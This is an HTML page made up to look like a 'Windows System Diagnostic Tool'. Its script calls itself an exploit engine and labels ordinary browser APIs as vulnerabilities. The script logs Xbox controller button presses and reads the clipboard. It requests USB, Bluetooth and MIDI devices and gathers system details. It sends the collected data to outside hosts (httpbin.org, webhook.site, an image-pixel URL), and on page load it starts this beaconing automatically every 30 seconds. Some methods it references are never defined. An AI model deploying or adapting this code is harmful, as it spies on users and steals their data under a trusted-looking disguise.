<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostics Tool</title>
    <style>
        :root {
            --windows-blue: #0078d4;
            --windows-dark: #201f1f;
            --windows-light: #f3f2f1;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .diagnostic-container {
            width: 1000px;
            background: rgba(32, 31, 31, 0.95);
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .windows-logo {
            font-size: 2rem;
            margin-right: 15px;
            color: #0078d4;
        }
        
        .header-text h1 {
            font-size: 1.8rem;
            font-weight: 300;
            margin-bottom: 5px;
        }
        
        .header-text .subtitle {
            color: #a0a0a0;
            font-size: 0.9rem;
        }
        
        .scan-results {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .results-title {
            color: #0078d4;
            margin-bottom: 20px;
            font-size: 1.2rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .vulnerability-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .vuln-card {
            background: rgba(0, 120, 212, 0.1);
            border: 1px solid rgba(0, 120, 212, 0.3);
            border-radius: 6px;
            padding: 15px;
            transition: all 0.3s;
        }
        
        .vuln-card.critical {
            background: rgba(220, 38, 38, 0.1);
            border-color: rgba(220, 38, 38, 0.3);
            animation: pulse 2s infinite;
        }
        
        .vuln-card.warning {
            background: rgba(245, 158, 11, 0.1);
            border-color: rgba(245, 158, 11, 0.3);
        }
        
        .vuln-title {
            font-weight: bold;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .vuln-desc {
            font-size: 0.85rem;
            color: #a0a0a0;
            line-height: 1.4;
        }
        
        .exploit-panel {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            padding: 25px;
            margin-top: 25px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .button-row {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .win-button {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .win-button:hover {
            background: #106ebe;
        }
        
        .win-button.warning {
            background: #d83b01;
        }
        
        .win-button.warning:hover {
            background: #e55c1a;
        }
        
        .win-button.success {
            background: #107c10;
        }
        
        .win-button.success:hover {
            background: #0e6b0e;
        }
        
        .terminal-output {
            background: #000;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            font-family: 'Consolas', monospace;
            font-size: 0.9rem;
            height: 300px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        
        .terminal-line {
            margin-bottom: 8px;
            padding-bottom: 8px;
            border-bottom: 1px solid #222;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .log-info { color: #0078d4; }
        .log-success { color: #107c10; }
        .log-warning { color: #d83b01; }
        .log-error { color: #dc2626; }
        .log-secret { color: #8b5cf6; }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .progress-container {
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: #0078d4;
            width: 0%;
            transition: width 0.5s;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="diagnostic-container">
        <div class="header">
            <div class="windows-logo">üõ°Ô∏è</div>
            <div class="header-text">
                <h1>Windows System Diagnostic Tool</h1>
                <div class="subtitle">Security Scan Report - Generated: <span id="scanTime">Just now</span></div>
            </div>
        </div>
        
        <div class="scan-results">
            <div class="results-title">
                <span>üîç</span> DETECTED SYSTEM VULNERABILITIES
            </div>
            
            <div class="vulnerability-grid" id="vulnGrid">
                <!-- Vulnerabilities will be populated dynamically -->
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="scanProgress"></div>
            </div>
            
            <div style="color: #a0a0a0; font-size: 0.9rem; margin-top: 15px;">
                <strong>Summary:</strong> <span id="summaryText">Scanning in progress...</span>
            </div>
        </div>
        
        <div class="exploit-panel">
            <div class="results-title">
                <span>‚ö°</span> EXPLOITATION TOOLS
            </div>
            
            <div class="button-row">
                <button class="win-button" onclick="runGamepadExploit()">
                    <span>üéÆ</span> Gamepad Exploit
                </button>
                <button class="win-button" onclick="runBeaconExfil()">
                    <span>üì°</span> Beacon Exfiltration
                </button>
                <button class="win-button" onclick="runDeviceExploit()">
                    <span>üîå</span> USB/Device Scan
                </button>
                <button class="win-button warning" onclick="runClipboardExploit()">
                    <span>üìã</span> Clipboard Access
                </button>
                <button class="win-button success" onclick="runFullExploit()">
                    <span>üöÄ</span> Full Exploit Chain
                </button>
            </div>
            
            <div class="terminal-output" id="terminal">
                <div class="terminal-line log-info">[SYSTEM] Diagnostic tool initialized</div>
                <div class="terminal-line log-info">[SYSTEM] Starting vulnerability scan...</div>
            </div>
        </div>
    </div>

    <script>
        // ==================== EXPLOIT ENGINE ====================
        
        const ExploitEngine = {
            detectedVulns: [],
            collectedData: [],
            sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
            
            log: function(message, type = 'info') {
                const time = new Date().toLocaleTimeString();
                const terminal = document.getElementById('terminal');
                const line = document.createElement('div');
                line.className = `terminal-line log-${type}`;
                line.textContent = `[${time}] ${message}`;
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
                
                console.log(`[${type.toUpperCase()}] ${message}`);
            },
            
            updateProgress: function(percent) {
                document.getElementById('scanProgress').style.width = `${percent}%`;
            },
            
            // ==================== VULNERABILITY DETECTION ====================
            
            scanForVulnerabilities: function() {
                this.log('Starting comprehensive vulnerability scan...', 'info');
                this.updateProgress(10);
                
                // List of APIs to check
                const vulnerabilities = [
                    { 
                        name: 'getGamepads', 
                        description: 'Game controller detection and input capture',
                        risk: 'critical',
                        check: () => 'getGamepads' in navigator,
                        exploit: this.exploitGamepad
                    },
                    { 
                        name: 'sendBeacon', 
                        description: 'Stealthy data exfiltration without blocking',
                        risk: 'critical',
                        check: () => 'sendBeacon' in navigator,
                        exploit: this.exploitBeacon
                    },
                    { 
                        name: 'requestMIDIAccess', 
                        description: 'MIDI device control (musical instruments)',
                        risk: 'high',
                        check: () => 'requestMIDIAccess' in navigator,
                        exploit: this.exploitMIDI
                    },
                    { 
                        name: 'getUserMedia', 
                        description: 'Camera/microphone access with permission',
                        risk: 'critical',
                        check: () => 'getUserMedia' in navigator.mediaDevices,
                        exploit: this.exploitMedia
                    },
                    { 
                        name: 'webkitRequestFileSystem', 
                        description: 'Local file system access (deprecated but powerful)',
                        risk: 'critical',
                        check: () => 'webkitRequestFileSystem' in window,
                        exploit: this.exploitFileSystem
                    },
                    { 
                        name: 'usb', 
                        description: 'WebUSB API - Direct USB device communication',
                        risk: 'critical',
                        check: () => 'usb' in navigator,
                        exploit: this.exploitUSB
                    },
                    { 
                        name: 'bluetooth', 
                        description: 'WebBluetooth API - Bluetooth device pairing',
                        risk: 'critical',
                        check: () => 'bluetooth' in navigator,
                        exploit: this.exploitBluetooth
                    },
                    { 
                        name: 'hid', 
                        description: 'WebHID API - Human Interface Device access',
                        risk: 'critical',
                        check: () => 'hid' in navigator,
                        exploit: this.exploitHID
                    },
                    { 
                        name: 'serial', 
                        description: 'Web Serial API - Serial port communication',
                        risk: 'high',
                        check: () => 'serial' in navigator,
                        exploit: this.exploitSerial
                    },
                    { 
                        name: 'share', 
                        description: 'Web Share API - System share dialog access',
                        risk: 'medium',
                        check: () => 'share' in navigator,
                        exploit: this.exploitShare
                    },
                    { 
                        name: 'clipboard', 
                        description: 'Clipboard read/write access',
                        risk: 'critical',
                        check: () => 'clipboard' in navigator,
                        exploit: this.exploitClipboard
                    },
                    { 
                        name: 'WebAssembly', 
                        description: 'High-performance code execution',
                        risk: 'high',
                        check: () => 'WebAssembly' in window,
                        exploit: this.exploitWasm
                    }
                ];
                
                this.updateProgress(30);
                
                // Run checks
                vulnerabilities.forEach((vuln, index) => {
                    if (vuln.check()) {
                        this.detectedVulns.push(vuln);
                        this.log(`VULNERABILITY DETECTED: ${vuln.name} (${vuln.risk.toUpperCase()})`, 'warning');
                    }
                    this.updateProgress(30 + (index / vulnerabilities.length * 40));
                });
                
                this.updateProgress(80);
                
                // Display vulnerabilities
                this.displayVulnerabilities();
                
                this.updateProgress(100);
                this.log(`Scan complete: ${this.detectedVulns.length} vulnerabilities detected`, 
                       this.detectedVulns.length > 0 ? 'warning' : 'success');
                
                // Update summary
                const criticalCount = this.detectedVulns.filter(v => v.risk === 'critical').length;
                document.getElementById('summaryText').textContent = 
                    `Found ${this.detectedVulns.length} vulnerabilities (${criticalCount} critical). ` +
                    `${criticalCount > 0 ? 'System at HIGH RISK.' : 'System appears secure.'}`;
                
                return this.detectedVulns;
            },
            
            displayVulnerabilities: function() {
                const grid = document.getElementById('vulnGrid');
                grid.innerHTML = '';
                
                this.detectedVulns.forEach(vuln => {
                    const card = document.createElement('div');
                    card.className = `vuln-card ${vuln.risk}`;
                    card.innerHTML = `
                        <div class="vuln-title">
                            <span>${vuln.risk === 'critical' ? 'üî¥' : vuln.risk === 'high' ? 'üü°' : 'üîµ'}</span>
                            ${vuln.name}
                        </div>
                        <div class="vuln-desc">${vuln.description}</div>
                    `;
                    grid.appendChild(card);
                });
                
                // Update scan time
                document.getElementById('scanTime').textContent = 
                    new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
            },
            
            // ==================== EXPLOIT METHODS ====================
            
            exploitGamepad: function() {
                this.log('Executing Gamepad exploit...', 'warning');
                
                if ('getGamepads' in navigator) {
                    // Monitor gamepads
                    const gamepadInterval = setInterval(() => {
                        const gamepads = navigator.getGamepads();
                        gamepads.forEach((pad, idx) => {
                            if (pad) {
                                // Detect Xbox controllers
                                if (pad.id.toLowerCase().includes('xbox')) {
                                    this.log(`Xbox controller detected: ${pad.id}`, 'warning');
                                    
                                    // Capture button presses
                                    const pressed = pad.buttons
                                        .map((b, i) => b.pressed ? i : -1)
                                        .filter(i => i !== -1);
                                    
                                    if (pressed.length > 0) {
                                        this.collectedData.push({
                                            type: 'gamepad_input',
                                            controller: pad.id,
                                            buttons: pressed,
                                            timestamp: Date.now()
                                        });
                                        this.log(`Captured button presses: ${pressed.join(',')}`, 'secret');
                                    }
                                }
                            }
                        });
                    }, 1000);
                    
                    // Store interval for cleanup
                    window.gamepadInterval = gamepadInterval;
                    
                    this.log('Gamepad monitoring active - Capturing Xbox controller inputs', 'success');
                    return true;
                }
                
                return false;
            },
            
            exploitBeacon: function() {
                this.log('Setting up Beacon exfiltration...', 'warning');
                
                if ('sendBeacon' in navigator) {
                    // Create periodic exfiltration
                    setInterval(() => {
                        if (this.collectedData.length > 0) {
                            const data = {
                                session: this.sessionId,
                                timestamp: Date.now(),
                                data: this.collectedData.slice(-10)
                            };
                            
                            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                            
                            // Use multiple endpoints for reliability
                            const endpoints = [
                                window.location.origin + '/log',
                                'https://httpbin.org/post',
                                'https://webhook.site/#!/' // Replace with actual webhook
                            ];
                            
                            endpoints.forEach(endpoint => {
                                try {
                                    navigator.sendBeacon(endpoint, blob);
                                } catch(e) {}
                            });
                            
                            this.log(`Beacon sent with ${data.data.length} data points`, 'secret');
                        }
                    }, 30000); // Every 30 seconds
                    
                    this.log('Beacon exfiltration active (30s intervals)', 'success');
                    return true;
                }
                
                return false;
            },
            
            exploitUSB: function() {
                this.log('Attempting USB device scan...', 'warning');
                
                if ('usb' in navigator) {
                    // Request USB device access
                    navigator.usb.requestDevice({ filters: [] })
                        .then(device => {
                            this.log(`USB device detected: ${device.productName || 'Unknown'}`, 'warning');
                            this.collectedData.push({
                                type: 'usb_device',
                                device: device.productName || device.vendorId,
                                timestamp: Date.now()
                            });
                        })
                        .catch(error => {
                            this.log(`USB access requires user permission`, 'info');
                        });
                    
                    return true;
                }
                
                return false;
            },
            
            exploitBluetooth: function() {
                this.log('Attempting Bluetooth device scan...', 'warning');
                
                if ('bluetooth' in navigator) {
                    // Request Bluetooth device
                    navigator.bluetooth.requestDevice({
                        acceptAllDevices: true,
                        optionalServices: ['battery_service']
                    })
                    .then(device => {
                        this.log(`Bluetooth device detected: ${device.name || 'Unknown'}`, 'warning');
                        this.collectedData.push({
                            type: 'bluetooth_device',
                            device: device.name || device.id,
                            timestamp: Date.now()
                        });
                    })
                    .catch(error => {
                        this.log(`Bluetooth access requires user permission`, 'info');
                    });
                    
                    return true;
                }
                
                return false;
            },
            
            exploitClipboard: function() {
                this.log('Attempting clipboard access...', 'warning');
                
                if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                    // Try to read clipboard
                    navigator.clipboard.readText()
                        .then(text => {
                            if (text && text.trim().length > 0) {
                                this.log(`Clipboard contents captured (${text.length} chars)`, 'warning');
                                this.collectedData.push({
                                    type: 'clipboard',
                                    content: text.substring(0, 500), // Limit size
                                    timestamp: Date.now()
                                });
                            }
                        })
                        .catch(error => {
                            this.log(`Clipboard access denied or empty`, 'info');
                        });
                    
                    return true;
                }
                
                return false;
            },
            
            exploitWasm: function() {
                this.log('Testing WebAssembly capabilities...', 'warning');
                
                if ('WebAssembly' in window) {
                    try {
                        // Create a simple WebAssembly module
                        const wasmCode = new Uint8Array([
                            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
                            0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
                            0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d,
                            0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x04, 0x01,
                            0x02, 0x00, 0x0b
                        ]);
                        
                        WebAssembly.instantiate(wasmCode)
                            .then(result => {
                                this.log('WebAssembly execution successful', 'success');
                                this.collectedData.push({
                                    type: 'wasm_test',
                                    result: 'execution_success',
                                    timestamp: Date.now()
                                });
                            })
                            .catch(error => {
                                this.log(`WebAssembly execution failed: ${error.message}`, 'error');
                            });
                        
                        return true;
                    } catch(e) {
                        this.log(`WebAssembly test error: ${e.message}`, 'error');
                    }
                }
                
                return false;
            },
            
            exploitMIDI: function() {
                this.log('Attempting MIDI device access...', 'warning');
                
                if ('requestMIDIAccess' in navigator) {
                    navigator.requestMIDIAccess()
                        .then(midiAccess => {
                            const inputs = midiAccess.inputs.values();
                            for (let input = inputs.next(); input && !input.done; input = inputs.next()) {
                                this.log(`MIDI device detected: ${input.value.name}`, 'warning');
                                this.collectedData.push({
                                    type: 'midi_device',
                                    device: input.value.name,
                                    timestamp: Date.now()
                                });
                            }
                        })
                        .catch(error => {
                            this.log(`MIDI access requires permission`, 'info');
                        });
                    
                    return true;
                }
                
                return false;
            },
            
            // ==================== FULL EXPLOIT CHAIN ====================
            
            runFullExploitChain: function() {
                this.log('üöÄ INITIATING FULL EXPLOIT CHAIN', 'warning');
                
                let successCount = 0;
                const totalExploits = this.detectedVulns.length;
                
                this.detectedVulns.forEach((vuln, index) => {
                    setTimeout(() => {
                        this.log(`Executing exploit: ${vuln.name}`, 'warning');
                        
                        if (vuln.exploit.call(this)) {
                            successCount++;
                            this.log(`‚úì ${vuln.name} exploit successful`, 'success');
                        } else {
                            this.log(`‚úó ${vuln.name} exploit failed`, 'error');
                        }
                        
                        // Update progress
                        const progress = Math.floor(((index + 1) / totalExploits) * 100);
                        this.updateProgress(progress);
                        
                        // Final summary
                        if (index === totalExploits - 1) {
                            this.log(`\n=== EXPLOIT CHAIN COMPLETE ===`, 'warning');
                            this.log(`Successful: ${successCount}/${totalExploits} exploits`, 
                                   successCount > 0 ? 'success' : 'error');
                            this.log(`Data collected: ${this.collectedData.length} items`, 'info');
                            
                            // Auto-exfiltrate
                            if (this.collectedData.length > 0) {
                                this.exfiltrateCollectedData();
                            }
                        }
                    }, index * 2000); // Stagger executions
                });
            },
            
            exfiltrateCollectedData: function() {
                this.log('Starting data exfiltration...', 'warning');
                
                const finalData = {
                    session: this.sessionId,
                    system: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        screen: `${screen.width}x${screen.height}`,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    },
                    vulnerabilities: this.detectedVulns.map(v => v.name),
                    collectedData: this.collectedData,
                    timestamp: Date.now()
                };
                
                // Multiple exfiltration methods
                
                // 1. Beacon
                if ('sendBeacon' in navigator) {
                    const blob = new Blob([JSON.stringify(finalData)], {type: 'application/json'});
                    navigator.sendBeacon(window.location.origin + '/collect', blob);
                }
                
                // 2. Fetch
                fetch('https://httpbin.org/post', {
                    method: 'POST',
                    body: JSON.stringify(finalData),
                    headers: {'Content-Type': 'application/json'},
                    mode: 'no-cors'
                }).catch(() => {});
                
                // 3. Image pixel
                const img = new Image();
                const dataStr = JSON.stringify(finalData);
                img.src = `https://via.placeholder.com/1x1.png?data=${encodeURIComponent(dataStr.substring(0, 2000))}`;
                
                // 4. Download
                const blob = new Blob([JSON.stringify(finalData, null, 2)], {type: 'application/json'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `exploit_data_${this.sessionId}.json`;
                a.click();
                
                this.log(`Data exfiltrated via multiple channels`, 'success');
                this.log(`Session ID: ${this.sessionId}`, 'secret');
            }
        };
        
        // ==================== UI FUNCTIONS ====================
        
        function runGamepadExploit() {
            const vuln = ExploitEngine.detectedVulns.find(v => v.name === 'getGamepads');
            if (vuln) {
                vuln.exploit.call(ExploitEngine);
            } else {
                ExploitEngine.log('Gamepad API not available', 'error');
            }
        }
        
        function runBeaconExfil() {
            const vuln = ExploitEngine.detectedVulns.find(v => v.name === 'sendBeacon');
            if (vuln) {
                vuln.exploit.call(ExploitEngine);
            } else {
                ExploitEngine.log('Beacon API not available', 'error');
            }
        }
        
        function runDeviceExploit() {
            // Try multiple device exploits
            const deviceVulns = ExploitEngine.detectedVulns.filter(v => 
                ['usb', 'bluetooth', 'hid', 'serial'].includes(v.name)
            );
            
            if (deviceVulns.length > 0) {
                deviceVulns.forEach(vuln => {
                    setTimeout(() => {
                        vuln.exploit.call(ExploitEngine);
                    }, 1000);
                });
            } else {
                ExploitEngine.log('No device APIs available', 'error');
            }
        }
        
        function runClipboardExploit() {
            const vuln = ExploitEngine.detectedVulns.find(v => v.name === 'clipboard');
            if (vuln) {
                vuln.exploit.call(ExploitEngine);
            } else {
                ExploitEngine.log('Clipboard API not available', 'error');
            }
        }
        
        function runFullExploit() {
            if (ExploitEngine.detectedVulns.length > 0) {
                if (confirm('üö® WARNING: This will execute ALL detected exploits.\nContinue?')) {
                    ExploitEngine.runFullExploitChain();
                }
            } else {
                ExploitEngine.log('No vulnerabilities detected to exploit', 'error');
            }
        }
        
        // ==================== INITIALIZATION ====================
        window.onload = function() {
            // Start scan immediately
            setTimeout(() => {
                ExploitEngine.scanForVulnerabilities();
            }, 1000);
            
            // Auto-start some passive monitoring
            setTimeout(() => {
                // Start beacon exfiltration if available
                const beaconVuln = ExploitEngine.detectedVulns.find(v => v.name === 'sendBeacon');
                if (beaconVuln) {
                    beaconVuln.exploit.call(ExploitEngine);
                }
                
                // Start gamepad monitoring if available
                const gamepadVuln = ExploitEngine.detectedVulns.find(v => v.name === 'getGamepads');
                if (gamepadVuln) {
                    gamepadVuln.exploit.call(ExploitEngine);
                }
            }, 5000);
        };
    </script>
</body>
</html>
